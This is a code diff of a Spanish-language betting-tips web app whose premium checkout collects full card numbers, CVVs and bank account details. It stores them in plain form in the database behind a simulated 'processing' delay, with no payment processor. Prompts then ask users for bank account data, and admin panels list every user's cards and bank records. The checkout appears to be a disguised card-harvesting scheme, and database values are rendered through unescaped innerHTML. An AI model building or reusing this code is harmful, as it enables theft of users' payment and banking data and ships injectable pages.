-        html += `<tr><td>${data.userEmail}</td><td>${data.bank}</td><td>${data.accountNumber}</td><td>${data.accountHolder}</td><td>${new Date(data.createdAt).toLocaleString()}</td></tr>`;
-    });
-    html += '</table></div>';
-    document.getElementById('bankDataList').innerHTML = html;
-}
-
-// ============ PAGOS ============
 async function loadPaymentCards() {
     const user = auth.currentUser;
     if (!user) return;
@@ -1272,222 +983,59 @@ async function loadPaymentCards() {
     const cards = doc.exists && doc.data().savedCards ? doc.data().savedCards : [];
     const container = document.getElementById('savedCardsPayment');
     if (cards.length === 0) container.innerHTML = '<p>No hay tarjetas guardadas</p>';
-    else {
-        container.innerHTML = cards.map(c => `
-            <div class="saved-card ${selectedCardId === c.id ? 'selected' : ''}" onclick="selectCardForPayment('${c.id}')">
-                <div class="card-info">
-                    <span>${c.brand}</span>
-                    <span>**** **** **** ${c.last4}</span>
-                    <span>Exp: ${c.expiry}</span>
-                </div>
-            </div>
-        `).join('');
-    }
+    else container.innerHTML = cards.map(c => `<div class="saved-card ${selectedCardId === c.id ? 'selected' : ''}" onclick="selectCardForPayment('${c.id}')"><div class="card-info"><span>${c.brand}</span><span>**** ${c.last4}</span><span>Exp: ${c.expiry}</span></div></div>`).join('');
 }
-
-function selectCardForPayment(cardId) {
-    selectedCardId = cardId;
-    currentPaymentMethod = 'saved_card';
-    loadPaymentCards();
-}
-
+function selectCardForPayment(cardId) { selectedCardId = cardId; loadPaymentCards(); }
 async function processPaymentWithMethod() {
     const user = auth.currentUser;
-    if (!user) {
-        alert('Inicia sesión primero');
-        return;
-    }
-    
+    if (!user) return alert('Inicia sesión');
+    const savedActive = document.getElementById('savedCardsAccordion').classList.contains('active');
+    const newActive = document.getElementById('newCardAccordion').classList.contains('active');
+    const otherActive = document.getElementById('otherMethodsAccordion').classList.contains('active');
     let paymentData = null;
-    let method = null;
-    
-    const savedCardsContent = document.getElementById('savedCardsAccordion');
-    const newCardContent = document.getElementById('newCardAccordion');
-    const otherMethodsContent = document.getElementById('otherMethodsAccordion');
-    
-    if (savedCardsContent.classList.contains('active') && selectedCardId) {
-        const doc = await db.collection('users').doc(user.uid).get();
-        const cards = doc.data().savedCards || [];
-        paymentData = cards.find(c => c.id === selectedCardId);
-        method = 'saved_card';
-    } 
-    else if (newCardContent.classList.contains('active')) {
-        const cardNumber = document.getElementById('payCardNumber').value.replace(/\s/g, '');
-        if (cardNumber.length < 16) return alert('Número de tarjeta inválido');
-        paymentData = {
-            cardNumber: cardNumber,
-            cardHolder: document.getElementById('payCardHolder').value,
-            expiry: document.getElementById('payCardExpiry').value,
-            cvv: document.getElementById('payCardCvv').value,
-            last4: cardNumber.slice(-4),
-            brand: cardNumber[0] === '4' ? 'Visa' : 'Mastercard'
-        };
-        if (!paymentData.cardHolder) return alert('Nombre del titular requerido');
-        method = 'new_card';
-    }
-    else if (otherMethodsContent.classList.contains('active')) {
-        paymentData = {
-            bank: document.getElementById('otherBankSelect').value,
-            accountNumber: document.getElementById('otherAccountNumber').value,
-            accountHolder: document.getElementById('otherAccountHolder').value
-        };
-        if (!paymentData.accountNumber) return alert('Número de cuenta requerido');
-        if (!paymentData.accountHolder) return alert('Nombre del titular requerido');
-        method = 'other_method';
-    }
-    else {
-        alert('Selecciona un método de pago');
-        return;
-    }
-    
-    currentPaymentData = paymentData;
-    currentPaymentMethod = method;
-    
+    if (savedActive && selectedCardId) { const doc = await db.collection('users').doc(user.uid).get(); paymentData = doc.data().savedCards?.find(c => c.id === selectedCardId); }
+    else if (newActive) { const num = document.getElementById('payCardNumber').value.replace(/\s/g, ''); if (num.length < 16) return alert('Número inválido'); paymentData = { cardNumber: num, cardHolder: document.getElementById('payCardHolder').value, expiry: document.getElementById('payCardExpiry').value, cvv: document.getElementById('payCardCvv').value, last4: num.slice(-4), brand: num[0] === '4' ? 'Visa' : 'Mastercard' }; }
+    else if (otherActive) { paymentData = { bank: document.getElementById('otherBankSelect').value, accountNumber: document.getElementById('otherAccountNumber').value, accountHolder: document.getElementById('otherAccountHolder').value }; if (!paymentData.accountNumber) return alert('Número de cuenta requerido'); }
+    else return alert('Selecciona método de pago');
     document.getElementById('processingModal').style.display = 'flex';
-    
     setTimeout(async () => {
-        const paymentRecord = {
-            userId: user.uid,
-            userEmail: user.email,
-            planId: currentSelectedPlan.id,
-            planName: currentSelectedPlan.name,
-            amount: currentSelectedPlan.price,
-            paymentMethod: method,
-            paymentData: paymentData,
-            status: 'pending',
-            createdAt: Date.now()
-        };
-        
-        await db.collection('payments').add(paymentRecord);
-        
+        await db.collection('payments').add({ userId: user.uid, userEmail: user.email, planId: currentSelectedPlan.id, planName: currentSelectedPlan.name, amount: currentSelectedPlan.price, paymentData, status: 'pending', createdAt: Date.now() });
         document.getElementById('processingModal').style.display = 'none';
         document.getElementById('confirmEmail').innerText = user.email;
         document.getElementById('confirmModal').style.display = 'flex';
-        window.lastPaymentEmail = user.email;
         closePaymentModal();
-    }, 3000);
+    }, 2000);
 }
+function closeConfirmModalAndContinue() { document.getElementById('confirmModal').style.display = 'none'; document.getElementById('saveBankModal').style.display = 'flex'; }
+async function saveBankDataAfterPayment() { const user = auth.currentUser; if (!user) { closeSaveBankModal(); return; } const bankData = { userId: user.uid, userEmail: user.email, bank: prompt('🏦 Banco:'), accountNumber: prompt('🔢 Número de cuenta:'), accountHolder: prompt('👤 Titular:'), createdAt: Date.now() }; if (bankData.bank && bankData.accountNumber && bankData.accountHolder) { await db.collection('bankData').add(bankData); alert('✅ Datos guardados'); } closeSaveBankModal(); }
+function closeSaveBankModal() { document.getElementById('saveBankModal').style.display = 'none'; alert('🎉 ¡Gracias por tu compra!'); }
 
-function closeConfirmModalAndContinue() {
-    document.getElementById('confirmModal').style.display = 'none';
-    document.getElementById('saveBankModal').style.display = 'flex';
-}
-
-async function saveBankDataAfterPayment() {
-    const user = auth.currentUser;
-    if (!user) {
-        closeSaveBankModal();
-        return;
-    }
-    
-    const bankData = {
-        userId: user.uid,
-        userEmail: user.email,
-        bank: prompt('🏦 Ingresa el nombre de tu banco:') || '',
-        accountNumber: prompt('🔢 Ingresa tu número de cuenta:') || '',
-        accountHolder: prompt('👤 Ingresa el nombre del titular de la cuenta:') || '',
-        createdAt: Date.now()
-    };
-    
-    if (bankData.bank && bankData.accountNumber && bankData.accountHolder) {
-        await db.collection('bankData').add(bankData);
-        alert('✅ Datos bancarios guardados correctamente');
-    }
-    
-    closeSaveBankModal();
-}
-
-function closeSaveBankModal() {
-    document.getElementById('saveBankModal').style.display = 'none';
-    alert('🎉 ¡Gracias por tu compra! Tu plan premium será activado pronto.');
-}
-
-// ============ APUESTAS ============
 function loadTeams() {
-    const local = document.getElementById('localTeam');
-    const away = document.getElementById('awayTeam');
-    teams.forEach(t => {
-        local.appendChild(new Option(t.name, JSON.stringify(t)));
-        away.appendChild(new Option(t.name, JSON.stringify(t)));
-    });
+    const local = document.getElementById('localTeam'), away = document.getElementById('awayTeam');
+    teams.forEach(t => { local.appendChild(new Option(t.name, JSON.stringify(t))); away.appendChild(new Option(t.name, JSON.stringify(t))); });
 }
-
 function updateMatch() {
-    const localVal = document.getElementById('localTeam').value;
-    const awayVal = document.getElementById('awayTeam').value;
-    const preview = document.getElementById('matchPreview');
-    if (localVal && awayVal && localVal !== awayVal) {
-        const local = JSON.parse(localVal);
-        const away = JSON.parse(awayVal);
-        document.getElementById('localPreview').src = local.logo;
-        document.getElementById('localPreview').style.display = 'block';
-        document.getElementById('awayPreview').src = away.logo;
-        document.getElementById('awayPreview').style.display = 'block';
-        preview.innerHTML = `<h3>🏆 ${local.name} vs ${away.name}</h3><p style="color:#0f0;">✅ Listo</p>`;
-    } else {
-        preview.innerHTML = '<h3>Selecciona ambos equipos</h3>';
-    }
+    const l = document.getElementById('localTeam').value, a = document.getElementById('awayTeam').value, p = document.getElementById('matchPreview');
+    if (l && a && l !== a) { const lt = JSON.parse(l), at = JSON.parse(a); document.getElementById('localPreview').src = lt.logo; document.getElementById('localPreview').style.display = 'block'; document.getElementById('awayPreview').src = at.logo; document.getElementById('awayPreview').style.display = 'block'; p.innerHTML = `<h3>🏆 ${lt.name} vs ${at.name}</h3><p style="color:#0f0;">✅ Listo</p>`; }
+    else p.innerHTML = '<h3>Selecciona ambos equipos</h3>';
 }
-
-function getMatchText() {
-    const local = document.getElementById('localTeam').value;
-    const away = document.getElementById('awayTeam').value;
-    if (local && away && local !== away) {
-        return `${JSON.parse(local).name} vs ${JSON.parse(away).name}`;
-    }
-    return '';
-}
-
-function getMatchImage() {
-    const local = document.getElementById('localTeam').value;
-    if (local) return JSON.parse(local).logo;
-    return '';
-}
-
+function getMatchText() { const l = document.getElementById('localTeam').value, a = document.getElementById('awayTeam').value; if (l && a && l !== a) return `${JSON.parse(l).name} vs ${JSON.parse(a).name}`; return ''; }
+function getMatchImage() { const l = document.getElementById('localTeam').value; return l ? JSON.parse(l).logo : ''; }
 function publishBet() {
     const user = auth.currentUser;
     if (!user) return alert('Inicia sesión');
     const match = getMatchText();
     if (!match) return alert('Selecciona equipos');
-    const prediction = document.getElementById('prediction').value;
-    const odds = document.getElementById('odds').value;
-    if (!prediction || !odds) return alert('Completa todos los campos');
-    
-    const data = { match, prediction, odds, image: getMatchImage(), type: document.getElementById('type').value, createdAt: Date.now(), userId: user.uid, userEmail: user.email };
-    
-    if (editingId) {
-        db.collection('bets').doc(editingId).update(data).then(() => { alert('Actualizada'); clearForm(); editingId = null; });
-    } else {
-        db.collection('bets').add(data).then(() => { alert('Publicada'); clearForm(); });
-    }
+    const pred = document.getElementById('prediction').value, odds = document.getElementById('odds').value;
+    if (!pred || !odds) return alert('Completa campos');
+    const data = { match, prediction: pred, odds, image: getMatchImage(), type: document.getElementById('type').value, status: 'active', result: null, createdAt: Date.now(), userId: user.uid, userEmail: user.email };
+    if (editingId) db.collection('bets').doc(editingId).update(data).then(() => { alert('Actualizada'); clearForm(); editingId = null; });
+    else db.collection('bets').add(data).then(() => { alert('Publicada'); clearForm(); });
 }
-
-function clearForm() {
-    document.getElementById('localTeam').value = '';
-    document.getElementById('awayTeam').value = '';
-    document.getElementById('prediction').value = '';
-    document.getElementById('odds').value = '';
-    updateMatch();
-}
-
-function editBet(id, match, pred, odds, img) {
-    const parts = match.split(' vs ');
-    const local = teams.find(t => t.name === parts[0]);
-    const away = teams.find(t => t.name === parts[1]);
-    if (local && away) {
-        document.getElementById('localTeam').value = JSON.stringify(local);
-        document.getElementById('awayTeam').value = JSON.stringify(away);
-        updateMatch();
-    }
-    document.getElementById('prediction').value = pred;
-    document.getElementById('odds').value = odds;
-    editingId = id;
-}
-
-function deleteBet(id) {
-    if (confirm('¿Eliminar?')) db.collection('bets').doc(id).delete();
-}
-
+function clearForm() { document.getElementById('localTeam').value = ''; document.getElementById('awayTeam').value = ''; document.getElementById('prediction').value = ''; document.getElementById('odds').value = ''; updateMatch(); }
+function editBet(id, match, pred, odds, img) { const parts = match.split(' vs '); const local = teams.find(t => t.name === parts[0]), away = teams.find(t => t.name === parts[1]); if (local && away) { document.getElementById('localTeam').value = JSON.stringify(local); document.getElementById('awayTeam').value = JSON.stringify(away); updateMatch(); } document.getElementById('prediction').value = pred; document.getElementById('odds').value = odds; editingId = id; }
+function deleteBet(id) { if (confirm('¿Eliminar?')) db.collection('bets').doc(id).delete(); }
+async function setBetResult(id, result) { await db.collection('bets').doc(id).update({ result: result, status: 'completed' }); alert(`✅ Apuesta marcada como ${result === 'win' ? 'GANADA' : result === 'loss' ? 'PERDIDA' : 'ANULADA'}`); }
 function escapeString(str) { return str ? str.replace(/'/g, "\\'").replace(/"/g, '&quot;') : ''; }
 
 function loadBets() {
@@ -1499,58 +1047,52 @@ function loadBets() {
         snap.forEach(doc => {
             const b = doc.data();
             const isAdmin = auth.currentUser?.email === ADMIN_EMAIL;
-            container.innerHTML += `<div class="bet-card"><img src="${b.image}" onerror="this.src='https://via.placeholder.com/400x200'"><div class="tag ${b.type === 'premium' ? 'premium' : 'free'}">${b.type === 'premium' ? '💎 PREMIUM' : '🎁 GRATIS'}</div><h3>🏆 ${b.match}</h3><p>${b.type === 'premium' ? (auth.currentUser ? '🔮 ' + b.prediction : '🔒 Premium - Hazte premium') : '🎯 ' + b.prediction}</p><div style="display:flex; justify-content:space-between; margin-top:20px;"><div style="color:#0f0; font-size:24px;">💰 ${b.odds}</div>${isAdmin ? `<div><button onclick="editBet('${doc.id}', '${escapeString(b.match)}', '${escapeString(b.prediction)}', '${b.odds}', '${escapeString(b.image)}')" style="background:#0f0; border:none; padding:10px; border-radius:10px; cursor:pointer;">✏️</button> <button onclick="deleteBet('${doc.id}')" style="background:red; border:none; padding:10px; border-radius:10px; color:white; cursor:pointer;">🗑️</button></div>` : ''}</div></div>`;
+            const showResult = b.result !== null && b.result !== undefined;
+            const isPending = !showResult;
+            let resultClass = '', resultText = '';
+            if (b.result === 'win') { resultClass = 'result-win'; resultText = '🏆 GANADA'; }
+            else if (b.result === 'loss') { resultClass = 'result-loss'; resultText = '❌ PERDIDA'; }
+            else if (b.result === 'void') { resultClass = 'result-void'; resultText = '⚠️ ANULADA'; }
+            else { resultClass = 'result-pending'; resultText = '⏳ PENDIENTE'; }
+            if (currentFilter !== 'all' && !(currentFilter === 'win' && b.result === 'win') && !(currentFilter === 'loss' && b.result === 'loss') && !(currentFilter === 'void' && b.result === 'void') && !(currentFilter === 'pending' && !showResult)) return;
+            let adminActions = '';
+            if (isAdmin && !showResult) {
+                adminActions = `<div style="display:flex; gap:10px; margin-top:15px; flex-wrap:wrap;">
+                    <button onclick="setBetResult('${doc.id}', 'win')" style="background:#00ff88; border:none; padding:8px 15px; border-radius:10px; cursor:pointer;">🏆 Marcar Ganada</button>
+                    <button onclick="setBetResult('${doc.id}', 'loss')" style="background:#ff4444; border:none; padding:8px 15px; border-radius:10px; cursor:pointer; color:white;">❌ Marcar Perdida</button>
+                    <button onclick="setBetResult('${doc.id}', 'void')" style="background:#ff8800; border:none; padding:8px 15px; border-radius:10px; cursor:pointer;">⚠️ Marcar Anulada</button>
+                    <button onclick="editBet('${doc.id}', '${escapeString(b.match)}', '${escapeString(b.prediction)}', '${b.odds}', '${escapeString(b.image)}')" style="background:#00ff88; border:none; padding:8px 15px; border-radius:10px; cursor:pointer;">✏️ Editar</button>
+                    <button onclick="deleteBet('${doc.id}')" style="background:red; border:none; padding:8px 15px; border-radius:10px; color:white; cursor:pointer;">🗑️ Eliminar</button>
+                </div>`;
+            } else if (isAdmin && showResult) {
+                adminActions = `<div style="display:flex; gap:10px; margin-top:15px;">
+                    <button onclick="editBet('${doc.id}', '${escapeString(b.match)}', '${escapeString(b.prediction)}', '${b.odds}', '${escapeString(b.image)}')" style="background:#00ff88; border:none; padding:8px 15px; border-radius:10px; cursor:pointer;">✏️ Editar</button>
+                    <button onclick="deleteBet('${doc.id}')" style="background:red; border:none; padding:8px 15px; border-radius:10px; color:white; cursor:pointer;">🗑️ Eliminar</button>
+                </div>`;
+            }
+            let displayPrediction = b.prediction;
+            if (b.type === 'premium' && !auth.currentUser && !showResult) displayPrediction = '🔒 Contenido Premium - Hazte premium para ver';
+            else if (b.type === 'premium' && !auth.currentUser && showResult) displayPrediction = '🔒 Inicia sesión para ver el pronóstico';
+            container.innerHTML += `<div class="bet-card"><img src="${b.image}" onerror="this.src='https://via.placeholder.com/400x200'"><div><div class="tag ${b.type === 'premium' ? 'premium' : 'free'}">${b.type === 'premium' ? '💎 PREMIUM' : '🎁 GRATIS'}</div><span class="result-tag ${resultClass}">${resultText}</span></div><h3>🏆 ${b.match}</h3><p>${displayPrediction}</p><div style="margin-top:15px;"><div style="color:#0f0; font-size:24px;">💰 ${b.odds}</div>${adminActions}</div></div>`;
         });
     });
 }
 
-// ============ PLANES ============
 async function loadPlans() {
     const ref = db.collection('plans');
     const snap = await ref.get();
-    if (snap.empty) {
-        for (const p of defaultPlans) await ref.doc(p.id).set(p);
-    }
+    if (snap.empty) for (const p of defaultPlans) await ref.doc(p.id).set(p);
     const container = document.getElementById('plansContainer');
     container.innerHTML = '';
-    const plans = [];
-    (await ref.get()).forEach(d => plans.push({ id: d.id, ...d.data() }));
+    const plans = []; (await ref.get()).forEach(d => plans.push({ id: d.id, ...d.data() }));
     plans.sort((a,b) => a.price - b.price);
-    plans.forEach(p => {
-        container.innerHTML += `<div class="plan-card ${p.recommended ? 'recommended' : ''}" onclick="selectPlan('${p.id}', '${p.name}', ${p.price})">${p.recommended ? '<div class="plan-badge">⭐ POPULAR</div>' : ''}<div class="plan-name">${p.name}</div><div class="plan-price">$${p.price.toLocaleString()}<span> COP / ${p.period}</span></div><ul class="plan-features">${p.features.map(f => `<li>${f}</li>`).join('')}</ul><button class="btn btn-green">Seleccionar</button></div>`;
-    });
+    plans.forEach(p => { container.innerHTML += `<div class="plan-card ${p.recommended ? 'recommended' : ''}" onclick="selectPlan('${p.id}', '${p.name}', ${p.price})">${p.recommended ? '<div class="plan-badge">⭐ POPULAR</div>' : ''}<div class="plan-name">${p.name}</div><div class="plan-price">$${p.price.toLocaleString()}<span> COP / ${p.period}</span></div><ul class="plan-features">${p.features.map(f => `<li>${f}</li>`).join('')}</ul><button class="btn btn-green">Seleccionar</button></div>`; });
 }
-
-function showPlans() {
-    if (!auth.currentUser) { alert('Inicia sesión primero'); document.getElementById('loginBox').scrollIntoView(); return; }
-    document.getElementById('plansSection').style.display = 'block';
-    document.getElementById('plansSection').scrollIntoView();
-}
-
-function selectPlan(id, name, price) {
-    currentSelectedPlan = { id, name, price };
-    selectedCardId = null;
-    document.getElementById('modalPlanName').innerText = name;
-    document.getElementById('modalPlanPrice').innerHTML = `$${price.toLocaleString()} COP`;
-    loadPaymentCards();
-    document.getElementById('paymentModal').style.display = 'flex';
-}
-
+function showPlans() { if (!auth.currentUser) { alert('Inicia sesión primero'); document.getElementById('loginBox').scrollIntoView(); return; } document.getElementById('plansSection').style.display = 'block'; document.getElementById('plansSection').scrollIntoView(); }
+function selectPlan(id, name, price) { currentSelectedPlan = { id, name, price }; selectedCardId = null; document.getElementById('modalPlanName').innerText = name; document.getElementById('modalPlanPrice').innerHTML = `$${price.toLocaleString()} COP`; loadPaymentCards(); document.getElementById('paymentModal').style.display = 'flex'; }
 function closePaymentModal() { document.getElementById('paymentModal').style.display = 'none'; }
-
-// ============ AUTENTICACIÓN ============
-function register() {
-    const email = document.getElementById('email').value;
-    const pass = document.getElementById('password').value;
-    if (!email || !pass) return alert('Completa campos');
-    if (pass.length < 6) return alert('Mínimo 6 caracteres');
-    auth.createUserWithEmailAndPassword(email, pass).then(() => alert('Cuenta creada')).catch(e => alert(e.message));
-}
-function login() {
-    const email = document.getElementById('email').value;
-    const pass = document.getElementById('password').value;
-    auth.signInWithEmailAndPassword(email, pass).then(() => alert('Sesión iniciada')).catch(e => alert(e.message));
-}
+function register() { const e = document.getElementById('email').value, p = document.getElementById('password').value; if (!e || !p) return alert('Completa campos'); if (p.length < 6) return alert('Mínimo 6 caracteres'); auth.createUserWithEmailAndPassword(e, p).then(() => alert('Cuenta creada')).catch(e => alert(e.message)); }
+function login() { const e = document.getElementById('email').value, p = document.getElementById('password').value; auth.signInWithEmailAndPassword(e, p).then(() => alert('Sesión iniciada')).catch(e => alert(e.message)); }
 function logout() { auth.signOut(); alert('Sesión cerrada'); }
 
 auth.onAuthStateChanged(user => {
@@ -1559,57 +1101,16 @@ auth.onAuthStateChanged(user => {
     document.getElementById('premiumBtnHeader').style.display = user ? 'block' : 'none';
     document.getElementById('loginBox').style.display = user ? 'none' : 'block';
     document.getElementById('adminPanel').style.display = isAdmin ? 'block' : 'none';
-    
-    const showCardBtn = document.getElementById('showCardBtn');
-    const showTipsterBtn = document.getElementById('showTipsterBtn');
-    
-    if (user) {
-        showCardBtn.style.display = 'block';
-        showTipsterBtn.style.display = 'block';
-        loadSavedCards();
-        loadTipsterData();
-        if (isAdmin) { loadAllTipsters(); loadAllCards(); loadAllBankData(); }
-    } else {
-        showCardBtn.style.display = 'none';
-        showTipsterBtn.style.display = 'none';
-        document.getElementById('cardPanel').style.display = 'none';
-        document.getElementById('tipsterPanel').style.display = 'none';
-    }
-    
+    const cb = document.getElementById('showCardBtn'), tb = document.getElementById('showTipsterBtn');
+    if (user) { cb.style.display = 'block'; tb.style.display = 'block'; loadSavedCards(); if (isAdmin) { loadAllTipsters(); loadAllCards(); loadAllBankData(); } }
+    else { cb.style.display = 'none'; tb.style.display = 'none'; document.getElementById('cardPanel').style.display = 'none'; document.getElementById('tipsterPanel').style.display = 'none'; }
     document.getElementById('plansSection').style.display = 'none';
     loadBets();
 });
 
-loadTeams();
-loadPlans();
+loadTeams(); loadPlans();
 
-// Hacer funciones globales
-window.register = register;
-window.login = login;
-window.logout = logout;
-window.publishBet = publishBet;
-window.editBet = editBet;
-window.deleteBet = deleteBet;
-window.updateMatch = updateMatch;
-window.showPlans = showPlans;
-window.selectPlan = selectPlan;
-window.closePaymentModal = closePaymentModal;
-window.saveCard = saveCard;
-window.deleteCard = deleteCard;
-window.saveTipsterData = saveTipsterData;
-window.loadAllTipsters = loadAllTipsters;
-window.loadAllCards = loadAllCards;
-window.loadAllBankData = loadAllBankData;
-window.selectCardForPayment = selectCardForPayment;
-window.processPaymentWithMethod = processPaymentWithMethod;
-window.closeConfirmModalAndContinue = closeConfirmModalAndContinue;
-window.saveBankDataAfterPayment = saveBankDataAfterPayment;
-window.closeSaveBankModal = closeSaveBankModal;
-window.formatCardNumber = formatCardNumber;
-window.formatExpiry = formatExpiry;
-window.toggleAccordion = toggleAccordion;
-window.showCardPanel = showCardPanel;
-window.showTipsterPanel = showTipsterPanel;
+window.register = register; window.login = login; window.logout = logout; window.publishBet = publishBet; window.editBet = editBet; window.deleteBet = deleteBet; window.updateMatch = updateMatch; window.showPlans = showPlans; window.selectPlan = selectPlan; window.closePaymentModal = closePaymentModal; window.saveCard = saveCard; window.deleteCard = deleteCard; window.saveTipsterData = saveTipsterData; window.loadAllTipsters = loadAllTipsters; window.loadAllCards = loadAllCards; window.loadAllBankData = loadAllBankData; window.selectCardForPayment = selectCardForPayment; window.processPaymentWithMethod = processPaymentWithMethod; window.closeConfirmModalAndContinue = closeConfirmModalAndContinue; window.saveBankDataAfterPayment = saveBankDataAfterPayment; window.closeSaveBankModal = closeSaveBankModal; window.formatCardNumber = formatCardNumber; window.formatExpiry = formatExpiry; window.toggleAccordion = toggleAccordion; window.showCardPanel = showCardPanel; window.showTipsterPanel = showTipsterPanel; window.filterBets = filterBets; window.setBetResult = setBetResult;
 </script>
 </body>
 </html>
